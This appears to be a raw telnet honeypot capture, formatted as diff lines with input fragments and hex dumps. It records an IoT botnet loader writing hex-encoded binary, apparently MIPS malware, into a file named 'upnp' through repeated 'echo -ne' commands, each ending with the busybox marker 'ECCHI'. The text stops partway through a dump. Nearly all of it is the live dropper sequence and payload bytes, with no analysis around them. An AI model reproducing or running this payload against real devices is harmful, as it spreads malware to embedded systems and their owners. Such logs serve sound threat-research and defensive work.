+echooooo TELIN: \x00
+echooooo TELIN: \x00
+echooooo TELIN: \x14 
+echooooo TELIN: \x40
+echooooo TELIN: \xff\xf
+echooooo TELIN: d\x2
+echooooo TELIN: 6\x1
+echooooo TELIN: 0\x00
+echooooo TELIN: \x01\x26\x10\
+echooooo TELIN: xff\xff
+echooooo TELIN: \x8f\
+echooooo TELIN: x85
+echooooo TELIN: \x80
+echooooo TELIN: \x18\
+echooooo TELIN: x8f\
+echooooo TELIN: x82\x80\x18
+echooooo TELIN: \x8f 
+echooooo TELIN: \x99\x80\x4
+echooooo TELIN: 8\x2
+echooooo TELIN: 4\x
+echooooo TELIN: a5\x05
+echooooo TELIN: \xe8
+echooooo TELIN: \x24\
+echooooo TELIN: x04\x00\x01\x
+echooooo TELIN: 24\
+echooooo TELIN: x06
+echooooo TELIN: \x00\x0
+echooooo TELIN: 6\x24
+echooooo TELIN: \x
+echooooo TELIN: 42\x
+echooooo TELIN: 05\xe
+echooooo TELIN: 0\x
+echooooo TELIN: 03 \x
+echooooo TELIN: 20\
+echooooo TELIN: xf8
+echooooo TELIN: \x09
+echooooo TELIN: \x0
+echooooo TELIN: 2\x
+echooooo TELIN: 02\x
+echooooo TELIN: 98\
+echooooo TELIN: x23\
+echooooo TELIN: x8f
+echooooo TELIN: \xbc
+echooooo TELIN: \x00
+echooooo TELIN: \x10
+echooooo TELIN: ' >>
+echooooo TELIN:  upn
+echooooo TELIN: p; 
+echooooo TELIN: /bin/b
+echooooo TELIN: usybox 
+echooooo TELIN: ECCHI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 32 34 5c 78  echo -ne '\x24\x
+  0010  30 32 5c 78 30 30 5c 78 30 32 5c 78 38 66 5c 78  02\x00\x02\x8f\x
+  0020  39 39 5c 78 38 30 5c 78 34 63 5c 78 61 37 5c 78  99\x80\x4c\xa7\x
+  0030  61 32 5c 78 30 30 5c 78 31 63 5c 78 32 34 5c 78  a2\x00\x1c\x24\x
+  0040  30 32 5c 78 30 30 5c 78 35 30 5c 78 32 34 5c 78  02\x00\x50\x24\x
+  0050  30 37 5c 78 30 30 5c 78 64 62 5c 78 32 34 5c 78  07\x00\xdb\x24\x
+  0060  30 34 5c 78 30 30 5c 78 34 64 5c 78 32 34 5c 78  04\x00\x4d\x24\x
+  0070  30 35 5c 78 30 30 5c 78 66 37 5c 78 32 34 5c 78  05\x00\xf7\x24\x
+  0080  30 36 5c 78 30 30 5c 78 62 35 5c 78 30 33 5c 78  06\x00\xb5\x03\x
+  0090  32 30 5c 78 66 38 5c 78 30 39 5c 78 61 37 5c 78  20\xf8\x09\xa7\x
+  00a0  61 32 5c 78 30 30 5c 78 31 65 5c 78 38 66 5c 78  a2\x00\x1e\x8f\x
+  00b0  62 63 5c 78 30 30 5c 78 31 30 5c 78 32 34 5c 78  bc\x00\x10\x24\x
+  00c0  30 35 5c 78 30 33 5c 78 30 31 5c 78 38 66 5c 78  05\x03\x01\x8f\x
+  00d0  38 34 5c 78 38 30 5c 78 31 38 5c 78 38 66 5c 78  84\x80\x18\x8f\x
+  00e0  39 39 5c 78 38 30 5c 78 36 30 5c 78 32 34 5c 78  99\x80\x60\x24\x
+  00f0  38 34 5c 78 30 35 5c 78 66 30 5c 78 32 34 5c 78  84\x05\xf0\x24\x
+  0100  30 36 5c 78 30 31 5c 78 66 66 5c 78 30 33 5c 78  06\x01\xff\x03\x
+  0110  32 30 5c 78 66 38 5c 78 30 39 5c 78 61 66 5c 78  20\xf8\x09\xaf\x
+  0120  61 32 5c 78 30 30 5c 78 32 30 5c 78 38 66 5c 78  a2\x00\x20\x8f\x
+  0130  62 63 5c 78 30 30 5c 78 31 30 5c 78 32 34 5c 78  bc\x00\x10\x24\x
+  0140  30 34 5c 78 30 30 5c 78 30 32 5c 78 38 66 5c 78  04\x00\x02\x8f\x
+  0150  39 39 5c 78 38 30 5c 78 35 30 5c 78 32 34 5c 78  99\x80\x50\x24\x
+  0160  30 35 5c 78 30 30 5c 78 30 32 5c 78 30 30 5c 78  05\x00\x02\x00\x
+  0170  30 30 5c 78 33 30 5c 78 32 31 5c 78 30 33 5c 78  00\x30\x21\x03\x
+  0180  32 30 5c 78 66 38 5c 78 30 39 5c 78 30 30 5c 78  20\xf8\x09\x00\x
+  0190  34 30 5c 78 39 30 5c 78 32 31 5c 78 30 30 5c 78  40\x90\x21\x00\x
+  01a0  34 30 5c 78 38 38 5c 78 32 31 5c 78 32 34 5c 78  40\x88\x21\x24\x
+  01b0  30 32 5c 78 66 66 5c 78 66 66 5c 78 38 66 5c 78  02\xff\xff\x8f\x
+  01c0  62 63 5c 78 30 30 5c 78 31 30 5c 78 31 32 5c 78  bc\x00\x10\x12\x
+  01d0  32 32 5c 78 30 30 5c 78 30 33 5c 78 30 30 5c 78  22\x00\x03\x00\x
+  01e0  30 30 5c 78 30 30 5c 78 30 30 5c 78 31 36 5c 78  00\x00\x00\x16\x
+  01f0  34 32 5c 78 30 30 5c 78 30 37 5c 78 30 30 5c 78  42\x00\x07\x00\x
+  0200  30 30 5c 78 30 30 5c 78 30 30 27 20 3e 3e 20 75  00\x00\x00' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x24\x02\x00\x02\x8f\x99\x80\x4c\xa7\xa2\x00\x1c\x24\x02\x00\x50\x24 \x07\x00\xdb\x24\x04\x00
+echooooo TELIN: \x4d
+echooooo TELIN: \x2
+echooooo TELIN: 4\x05\x
+echooooo TELIN: 00\x
+echooooo TELIN: f7\x
+echooooo TELIN: 24\x06\x00
+echooooo TELIN: \xb5\x
+echooooo TELIN: 03\x20\
+echooooo TELIN: xf8\x09\x
+echooooo TELIN: a7 \
+echooooo TELIN: xa2\
+echooooo TELIN: x00\
+echooooo TELIN: x1e\x8f\xbc\x
+echooooo TELIN: 00\x
+echooooo TELIN: 10\x
+echooooo TELIN: 24\x
+echooooo TELIN: 05\x
+echooooo TELIN: 03\x
+echooooo TELIN: 01\x
+echooooo TELIN: 8f
+echooooo TELIN: \x84\x80\x1
+echooooo TELIN: 8\x8
+echooooo TELIN: f\x9
+echooooo TELIN: 9\x
+echooooo TELIN: 80\x
+echooooo TELIN: 60\x2
+echooooo TELIN: 4 \x8
+echooooo TELIN: 4\x0
+echooooo TELIN: 5\xf0\x
+echooooo TELIN: 24\x
+echooooo TELIN: 06\x
+echooooo TELIN: 01\x
+echooooo TELIN: ff\x0
+echooooo TELIN: 3\x2
+echooooo TELIN: 0\xf
+echooooo TELIN: 8\x09\xaf\xa2\
+echooooo TELIN: x00\x20\x8f\xbc\x00\
+echooooo TELIN: x10\x24 
+echooooo TELIN: \x04\
+echooooo TELIN: x00\x02\x8
+echooooo TELIN: f\x9
+echooooo TELIN: 9\x8
+echooooo TELIN: 0\x50
+echooooo TELIN: \x24
+echooooo TELIN: \x05\
+echooooo TELIN: x00\
+echooooo TELIN: x02\
+echooooo TELIN: x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 30\x21
+echooooo TELIN: \x03\
+echooooo TELIN: x20
+echooooo TELIN: \xf8
+echooooo TELIN: \x0
+echooooo TELIN: 9\x0
+echooooo TELIN: 0 \x4
+echooooo TELIN: 0\x
+echooooo TELIN: 90\
+echooooo TELIN: x21\x00\
+echooooo TELIN: x40\x88\x21\x
+echooooo TELIN: 24\x
+echooooo TELIN: 02\
+echooooo TELIN: xff
+echooooo TELIN: \xff
+echooooo TELIN: \x8f\
+echooooo TELIN: xbc\x00\
+echooooo TELIN: x10\x12\
+echooooo TELIN: x22\x00\
+echooooo TELIN: x03\x00 
+echooooo TELIN: \x00
+echooooo TELIN: \x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x
+echooooo TELIN: 16\
+echooooo TELIN: x42\
+echooooo TELIN: x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 7\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00' 
+echooooo TELIN: >> u
+echooooo TELIN: pnp;
+echooooo TELIN:  /bi
+echooooo TELIN: n/b
+echooooo TELIN: usyb
+echooooo TELIN: ox 
+echooooo TELIN: ECCH
+echooooo TELIN: I
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 38 66 5c 78  echo -ne '\x8f\x
+  0010  39 39 5c 78 38 30 5c 78 35 34 5c 78 30 30 5c 78  99\x80\x54\x00\x
+  0020  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  0030  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  0040  30 34 5c 78 30 30 5c 78 30 31 5c 78 38 66 5c 78  04\x00\x01\x8f\x
+  0050  62 63 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  bc\x00\x10\x00\x
+  0060  30 30 5c 78 30 30 5c 78 30 30 5c 78 38 66 5c 78  00\x00\x00\x8f\x
+  0070  39 39 5c 78 38 30 5c 78 34 34 5c 78 30 32 5c 78  99\x80\x44\x02\x
+  0080  32 30 5c 78 32 30 5c 78 32 31 5c 78 32 37 5c 78  20\x20\x21\x27\x
+  0090  61 35 5c 78 30 30 5c 78 31 63 5c 78 30 33 5c 78  a5\x00\x1c\x03\x
+  00a0  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  00b0  30 36 5c 78 30 30 5c 78 31 30 5c 78 38 66 5c 78  06\x00\x10\x8f\x
+  00c0  62 63 5c 78 30 30 5c 78 31 30 5c 78 30 34 5c 78  bc\x00\x10\x04\x
+  00d0  34 31 5c 78 30 30 5c 78 30 66 5c 78 30 30 5c 78  41\x00\x0f\x00\x
+  00e0  34 30 5c 78 38 30 5c 78 32 31 5c 78 38 66 5c 78  40\x80\x21\x8f\x
+  00f0  38 35 5c 78 38 30 5c 78 31 38 5c 78 38 66 5c 78  85\x80\x18\x8f\x
+  0100  39 39 5c 78 38 30 5c 78 34 38 5c 78 32 34 5c 78  99\x80\x48\x24\x
+  0110  61 35 5c 78 30 35 5c 78 66 63 5c 78 32 34 5c 78  a5\x05\xfc\x24\x
+  0120  30 34 5c 78 30 30 5c 78 30 31 5c 78 30 33 5c 78  04\x00\x01\x03\x
+  0130  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  0140  30 36 5c 78 30 30 5c 78 30 34 5c 78 38 66 5c 78  06\x00\x04\x8f\x
+  0150  62 63 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  bc\x00\x10\x00\x
+  0160  30 30 5c 78 30 30 5c 78 30 30 5c 78 38 66 5c 78  00\x00\x00\x8f\x
+  0170  39 39 5c 78 38 30 5c 78 35 34 5c 78 30 30 5c 78  99\x80\x54\x00\x
+  0180  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  0190  32 30 5c 78 66 38 5c 78 30 39 5c 78 30 30 5c 78  20\xf8\x09\x00\x
+  01a0  31 30 5c 78 32 30 5c 78 32 33 5c 78 38 66 5c 78  10\x20\x23\x8f\x
+  01b0  62 63 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  bc\x00\x10\x00\x
+  01c0  30 30 5c 78 30 30 5c 78 30 30 5c 78 38 66 5c 78  00\x00\x00\x8f\x
+  01d0  38 35 5c 78 38 30 5c 78 31 38 5c 78 38 66 5c 78  85\x80\x18\x8f\x
+  01e0  39 39 5c 78 38 30 5c 78 34 38 5c 78 32 36 5c 78  99\x80\x48\x26\x
+  01f0  37 30 5c 78 30 30 5c 78 31 64 5c 78 32 34 5c 78  70\x00\x1d\x24\x
+  0200  61 35 5c 78 30 36 5c 78 30 34 27 20 3e 3e 20 75  a5\x06\x04' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x8f\x99\x80\x54\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x01\x8f \xbc\x00\x10
+echooooo TELIN: \x00\x00\x00\x00\x8f\x99\x80\x44\x02\x20\x20\x21\x27\xa5\x00\x1c\x03 \x20\xf8\x09\x24\x06\x00\x10\x8f\
+echooooo TELIN: xb
+echooooo TELIN: c\x00\x10\x04\x41
+echooooo TELIN: \x00\
+echooooo TELIN: x0f
+echooooo TELIN: \x00
+echooooo TELIN: \x4
+echooooo TELIN: 0\x80
+echooooo TELIN: \x21
+echooooo TELIN: \x8
+echooooo TELIN: f \x85\
+echooooo TELIN: x80\
+echooooo TELIN: x18
+echooooo TELIN: \x8f
+echooooo TELIN: \x99
+echooooo TELIN: \x80
+echooooo TELIN: \x48\x24\xa5\x05
+echooooo TELIN: \xfc\
+echooooo TELIN: x24\x04
+echooooo TELIN: \x00\x01\x03\x20
+echooooo TELIN: \xf8\x
+echooooo TELIN: 09\
+echooooo TELIN: x24 \
+echooooo TELIN: x06\x
+echooooo TELIN: 00\x04\x8f\xb
+echooooo TELIN: c\x0
+echooooo TELIN: 0\x10\x0
+echooooo TELIN: 0\x00
+echooooo TELIN: \x00\x00\
+echooooo TELIN: x8f\x
+echooooo TELIN: 99\x
+echooooo TELIN: 80\
+echooooo TELIN: x54
+echooooo TELIN: \x00
+echooooo TELIN: \x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 0\x
+echooooo TELIN: 00\x0
+echooooo TELIN: 3 \x
+echooooo TELIN: 20\x
+echooooo TELIN: f8\x
+echooooo TELIN: 09\x0
+echooooo TELIN: 0\x10
+echooooo TELIN: \x20
+echooooo TELIN: \x23\x8f
+echooooo TELIN: \xbc
+echooooo TELIN: \x00
+echooooo TELIN: \x10\
+echooooo TELIN: x00\x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\
+echooooo TELIN: x8f\x85\x
+echooooo TELIN: 80\
+echooooo TELIN: x18
+echooooo TELIN: \x8f 
+echooooo TELIN: \x99\x80\x48\x2
+echooooo TELIN: 6\x70\x
+echooooo TELIN: 00\x1
+echooooo TELIN: d\x2
+echooooo TELIN: 4\x
+echooooo TELIN: a5\x0
+echooooo TELIN: 6\x04' >
+echooooo TELIN: > up
+echooooo TELIN: np; 
+echooooo TELIN: /bin
+echooooo TELIN: /bus
+echooooo TELIN: ybo
+echooooo TELIN: x EC
+echooooo TELIN: CHI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+# 
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 30 32 5c 78  echo -ne '\x02\x
+  0010  32 30 5c 78 32 30 5c 78 32 31 5c 78 30 33 5c 78  20\x20\x21\x03\x
+  0020  32 30 5c 78 66 38 5c 78 30 39 5c 78 30 32 5c 78  20\xf8\x09\x02\x
+  0030  30 30 5c 78 33 30 5c 78 32 31 5c 78 38 66 5c 78  00\x30\x21\x8f\x
+  0040  62 63 5c 78 30 30 5c 78 31 30 5c 78 31 30 5c 78  bc\x00\x10\x10\x
+  0050  35 30 5c 78 30 30 5c 78 30 37 5c 78 30 30 5c 78  50\x00\x07\x00\x
+  0060  30 30 5c 78 38 30 5c 78 32 31 5c 78 38 66 5c 78  00\x80\x21\x8f\x
+  0070  39 39 5c 78 38 30 5c 78 35 34 5c 78 30 30 5c 78  99\x80\x54\x00\x
+  0080  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  0090  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  00a0  30 34 5c 78 30 30 5c 78 30 33 5c 78 38 66 5c 78  04\x00\x03\x8f\x
+  00b0  62 63 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  bc\x00\x10\x00\x
+  00c0  30 30 5c 78 38 30 5c 78 32 31 5c 78 38 66 5c 78  00\x80\x21\x8f\x
+  00d0  39 39 5c 78 38 30 5c 78 33 38 5c 78 30 32 5c 78  99\x80\x38\x02\x
+  00e0  32 30 5c 78 32 30 5c 78 32 31 5c 78 32 37 5c 78  20\x20\x21\x27\x
+  00f0  61 35 5c 78 30 30 5c 78 31 38 5c 78 30 33 5c 78  a5\x00\x18\x03\x
+  0100  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  0110  30 36 5c 78 30 30 5c 78 30 31 5c 78 38 66 5c 78  06\x00\x01\x8f\x
+  0120  62 63 5c 78 30 30 5c 78 31 30 5c 78 32 34 5c 78  bc\x00\x10\x24\x
+  0130  30 33 5c 78 30 30 5c 78 30 31 5c 78 38 66 5c 78  03\x00\x01\x8f\x
+  0140  39 39 5c 78 38 30 5c 78 35 34 5c 78 31 30 5c 78  99\x80\x54\x10\x
+  0150  34 33 5c 78 30 30 5c 78 30 34 5c 78 32 34 5c 78  43\x00\x04\x24\x
+  0160  30 34 5c 78 30 30 5c 78 30 34 5c 78 30 33 5c 78  04\x00\x04\x03\x
+  0170  32 30 5c 78 66 38 5c 78 30 39 5c 78 30 30 5c 78  20\xf8\x09\x00\x
+  0180  30 30 5c 78 30 30 5c 78 30 30 5c 78 38 66 5c 78  00\x00\x00\x8f\x
+  0190  62 63 5c 78 30 30 5c 78 31 30 5c 78 38 33 5c 78  bc\x00\x10\x83\x
+  01a0  61 33 5c 78 30 30 5c 78 31 38 5c 78 30 30 5c 78  a3\x00\x18\x00\x
+  01b0  31 30 5c 78 31 32 5c 78 30 30 5c 78 30 30 5c 78  10\x12\x00\x00\x
+  01c0  34 33 5c 78 38 30 5c 78 32 35 5c 78 33 63 5c 78  43\x80\x25\x3c\x
+  01d0  30 32 5c 78 30 64 5c 78 30 61 5c 78 33 34 5c 78  02\x0d\x0a\x34\x
+  01e0  34 32 5c 78 30 64 5c 78 30 61 5c 78 31 36 5c 78  42\x0d\x0a\x16\x
+  01f0  30 32 5c 78 66 66 5c 78 65 64 5c 78 30 30 5c 78  02\xff\xed\x00\x
+  0200  30 30 5c 78 30 30 5c 78 30 30 27 20 3e 3e 20 75  00\x00\x00' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: e
+echooooo TELIN: cho -ne '\x02\x20\x20\x21\x03\x20\xf8\x09\x02\x00\x30\x21\x8f\xbc\x00\x10\x10 \x50\x00\x07\x00\x00\x8
+echooooo TELIN: 0\x21\x
+echooooo TELIN: 8f\x9
+echooooo TELIN: 9\x80
+echooooo TELIN: \x54
+echooooo TELIN: \x00\
+echooooo TELIN: x00\
+echooooo TELIN: x00\x
+echooooo TELIN: 00\x03\
+echooooo TELIN: x20\x
+echooooo TELIN: f8\x
+echooooo TELIN: 09\x24 \x0
+echooooo TELIN: 4\x00
+echooooo TELIN: \x03
+echooooo TELIN: \x8f\
+echooooo TELIN: xbc\x00\x10\x
+echooooo TELIN: 00\x00\x80\x21\x8f\x9
+echooooo TELIN: 9\x80
+echooooo TELIN: \x38\
+echooooo TELIN: x02\
+echooooo TELIN: x20\
+echooooo TELIN: x20\x
+echooooo TELIN: 21\
+echooooo TELIN: x27 \x
+echooooo TELIN: a5\x
+echooooo TELIN: 00\x1
+echooooo TELIN: 8\x03\x20
+echooooo TELIN: \xf8\x
+echooooo TELIN: 09\x2
+echooooo TELIN: 4\x0
+echooooo TELIN: 6\x0
+echooooo TELIN: 0\x01\x8f\xbc\
+echooooo TELIN: x00\x10\x24\x03\x
+echooooo TELIN: 00\x01\x
+echooooo TELIN: 8f \x
+echooooo TELIN: 99\x
+echooooo TELIN: 80\x
+echooooo TELIN: 54\x1
+echooooo TELIN: 0\x
+echooooo TELIN: 43\x
+echooooo TELIN: 00\
+echooooo TELIN: x04\x24\x04\x00\x0
+echooooo TELIN: 4\x03\x2
+echooooo TELIN: 0\xf8\x09
+echooooo TELIN: \x00
+echooooo TELIN: \x00\x00\x00\x8f 
+echooooo TELIN: \xbc\x
+echooooo TELIN: 00\x10
+echooooo TELIN: \x83\
+echooooo TELIN: xa3\x
+echooooo TELIN: 00\
+echooooo TELIN: x18\
+echooooo TELIN: x00
+echooooo TELIN: \x10
+echooooo TELIN: \x12\
+echooooo TELIN: x00
+echooooo TELIN: \x0
+echooooo TELIN: 0\x4
+echooooo TELIN: 3\x8
+echooooo TELIN: 0\x2
+echooooo TELIN: 5\x
+echooooo TELIN: 3c\x
+echooooo TELIN: 02\
+echooooo TELIN: x0d\x0a\x3
+echooooo TELIN: 4 \x
+echooooo TELIN: 42\
+echooooo TELIN: x0d\x
+echooooo TELIN: 0a\
+echooooo TELIN: x1
+echooooo TELIN: 6\x
+echooooo TELIN: 02\xff\xe
+echooooo TELIN: d\x
+echooooo TELIN: 00\x00\x
+echooooo TELIN: 00\x00' 
+echooooo TELIN: >> u
+echooooo TELIN: pn
+echooooo TELIN: p; /
+echooooo TELIN: bin/
+echooooo TELIN: bu
+echooooo TELIN: syb
+echooooo TELIN: ox 
+echooooo TELIN: ECCH
+echooooo TELIN: I
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 38 66 5c 78  echo -ne '\x8f\x
+  0010  39 39 5c 78 38 30 5c 78 33 38 5c 78 32 37 5c 78  99\x80\x38\x27\x
+  0020  62 30 5c 78 30 30 5c 78 32 63 5c 78 30 32 5c 78  b0\x00\x2c\x02\x
+  0030  32 30 5c 78 32 30 5c 78 32 31 5c 78 30 32 5c 78  20\x20\x21\x02\x
+  0040  30 30 5c 78 32 38 5c 78 32 31 5c 78 30 33 5c 78  00\x28\x21\x03\x
+  0050  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  0060  30 36 5c 78 30 30 5c 78 38 30 5c 78 38 66 5c 78  06\x00\x80\x8f\x
+  0070  62 63 5c 78 30 30 5c 78 31 30 5c 78 30 32 5c 78  bc\x00\x10\x02\x
+  0080  30 30 5c 78 32 38 5c 78 32 31 5c 78 38 66 5c 78  00\x28\x21\x8f\x
+  0090  39 39 5c 78 38 30 5c 78 34 38 5c 78 30 30 5c 78  99\x80\x48\x00\x
+  00a0  34 30 5c 78 33 30 5c 78 32 31 5c 78 31 38 5c 78  40\x30\x21\x18\x
+  00b0  34 30 5c 78 30 30 5c 78 30 36 5c 78 30 32 5c 78  40\x00\x06\x02\x
+  00c0  34 30 5c 78 32 30 5c 78 32 31 5c 78 30 33 5c 78  40\x20\x21\x03\x
+  00d0  32 30 5c 78 66 38 5c 78 30 39 5c 78 30 30 5c 78  20\xf8\x09\x00\x
+  00e0  30 30 5c 78 30 30 5c 78 30 30 5c 78 38 66 5c 78  00\x00\x00\x8f\x
+  00f0  62 63 5c 78 30 30 5c 78 31 30 5c 78 31 30 5c 78  bc\x00\x10\x10\x
+  0100  30 30 5c 78 66 66 5c 78 66 30 5c 78 30 30 5c 78  00\xff\xf0\x00\x
+  0110  30 30 5c 78 30 30 5c 78 30 30 5c 78 38 66 5c 78  00\x00\x00\x8f\x
+  0120  39 39 5c 78 38 30 5c 78 35 38 5c 78 30 30 5c 78  99\x80\x58\x00\x
+  0130  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  0140  32 30 5c 78 66 38 5c 78 30 39 5c 78 30 32 5c 78  20\xf8\x09\x02\x
+  0150  32 30 5c 78 32 30 5c 78 32 31 5c 78 38 66 5c 78  20\x20\x21\x8f\x
+  0160  62 63 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  bc\x00\x10\x00\x
+  0170  30 30 5c 78 30 30 5c 78 30 30 5c 78 38 66 5c 78  00\x00\x00\x8f\x
+  0180  39 39 5c 78 38 30 5c 78 35 38 5c 78 30 30 5c 78  99\x80\x58\x00\x
+  0190  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  01a0  32 30 5c 78 66 38 5c 78 30 39 5c 78 30 32 5c 78  20\xf8\x09\x02\x
+  01b0  34 30 5c 78 32 30 5c 78 32 31 5c 78 38 66 5c 78  40\x20\x21\x8f\x
+  01c0  62 63 5c 78 30 30 5c 78 31 30 5c 78 32 34 5c 78  bc\x00\x10\x24\x
+  01d0  30 34 5c 78 30 30 5c 78 30 31 5c 78 38 66 5c 78  04\x00\x01\x8f\x
+  01e0  38 35 5c 78 38 30 5c 78 31 38 5c 78 38 66 5c 78  85\x80\x18\x8f\x
+  01f0  39 39 5c 78 38 30 5c 78 34 38 5c 78 32 34 5c 78  99\x80\x48\x24\x
+  0200  61 35 5c 78 30 36 5c 78 32 38 27 20 3e 3e 20 75  a5\x06\x28' >> u
+  0210  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0220  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+TELIN: # 
+echooooo TELIN: echo -ne '\x8f\x99\x80\x38\x27\xb0\x00\x2c\x02\x20\x20\x21\x02\x00\x28\x21\x03 \x20\xf8\x09\x24\
+echooooo TELIN: x06
+echooooo TELIN: \x0
+echooooo TELIN: 0\x80\x8f\xbc\x00\x1
+echooooo TELIN: 0\x0
+echooooo TELIN: 2\x00
+echooooo TELIN: \x28
+echooooo TELIN: \x2
+echooooo TELIN: 1\x8f
+echooooo TELIN: \x99
+echooooo TELIN: \x80\x48\x0
+echooooo TELIN: 0 \x4
+echooooo TELIN: 0\x3
+echooooo TELIN: 0\x
+echooooo TELIN: 21\x18
+echooooo TELIN: \x40
+echooooo TELIN: \x0
+echooooo TELIN: 0\x0
+echooooo TELIN: 6\x02\x
+echooooo TELIN: 40\x20
+echooooo TELIN: \x21\x03
+echooooo TELIN: \x20\
+echooooo TELIN: xf8\x
+echooooo TELIN: 09
+echooooo TELIN: \x00\x00\x00\x00\x
+echooooo TELIN: 8f \xbc
+echooooo TELIN: \x0
+echooooo TELIN: 0\x10\x
+echooooo TELIN: 10\x00\xff
+echooooo TELIN: \xf0
+echooooo TELIN: \x00\x0
+echooooo TELIN: 0\x00\
+echooooo TELIN: x00\
+echooooo TELIN: x8f\
+echooooo TELIN: x99\
+echooooo TELIN: x80\
+echooooo TELIN: x58
+echooooo TELIN: \x00
+echooooo TELIN: \x00
+echooooo TELIN: \x00\
+echooooo TELIN: x00\
+echooooo TELIN: x03 \
+echooooo TELIN: x20\xf
+echooooo TELIN: 8\x0
+echooooo TELIN: 9\x0
+echooooo TELIN: 2\x2
+echooooo TELIN: 0\x20\x21\x8f
+echooooo TELIN: \xbc\x00\x10\x00\x00\x00
+echooooo TELIN: \x00
+echooooo TELIN: \x8f
+echooooo TELIN: \x99\
+echooooo TELIN: x80\
+echooooo TELIN: x58\
+echooooo TELIN: x00 \
+echooooo TELIN: x00\x
+echooooo TELIN: 00\x
+echooooo TELIN: 00\
+echooooo TELIN: x03\x
+echooooo TELIN: 20\xf
+echooooo TELIN: 8\x
+echooooo TELIN: 09\x
+echooooo TELIN: 02\
+echooooo TELIN: x40\
+echooooo TELIN: x20
+echooooo TELIN: \x2
+echooooo TELIN: 1\x
+echooooo TELIN: 8f\x
+echooooo TELIN: bc\
+echooooo TELIN: x00\
+echooooo TELIN: x10\x24\x
+echooooo TELIN: 04\
+echooooo TELIN: x00\x
+echooooo TELIN: 01\x8f \
+echooooo TELIN: x85\
+echooooo TELIN: x80\x18
+echooooo TELIN: \x8f\x99\x80\x48
+echooooo TELIN: \x24\xa5\x
+echooooo TELIN: 06\x28' >> up
+echooooo TELIN: np; /
+echooooo TELIN: bin/b
+echooooo TELIN: usy
+echooooo TELIN: box 
+echooooo TELIN: ECC
+echooooo TELIN: HI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 30 33 5c 78  echo -ne '\x03\x
+  0010  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  0020  30 36 5c 78 30 30 5c 78 30 34 5c 78 38 66 5c 78  06\x00\x04\x8f\x
+  0030  62 63 5c 78 30 30 5c 78 31 30 5c 78 30 30 5c 78  bc\x00\x10\x00\x
+  0040  30 30 5c 78 30 30 5c 78 30 30 5c 78 38 66 5c 78  00\x00\x00\x8f\x
+  0050  39 39 5c 78 38 30 5c 78 35 34 5c 78 30 30 5c 78  99\x80\x54\x00\x
+  0060  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 33 5c 78  00\x00\x00\x03\x
+  0070  32 30 5c 78 66 38 5c 78 30 39 5c 78 32 34 5c 78  20\xf8\x09\x24\x
+  0080  30 34 5c 78 30 30 5c 78 30 35 5c 78 38 66 5c 78  04\x00\x05\x8f\x
+  0090  62 63 5c 78 30 30 5c 78 31 30 5c 78 38 66 5c 78  bc\x00\x10\x8f\x
+  00a0  62 66 5c 78 30 30 5c 78 63 30 5c 78 38 66 5c 78  bf\x00\xc0\x8f\x
+  00b0  62 33 5c 78 30 30 5c 78 62 63 5c 78 38 66 5c 78  b3\x00\xbc\x8f\x
+  00c0  62 32 5c 78 30 30 5c 78 62 38 5c 78 38 66 5c 78  b2\x00\xb8\x8f\x
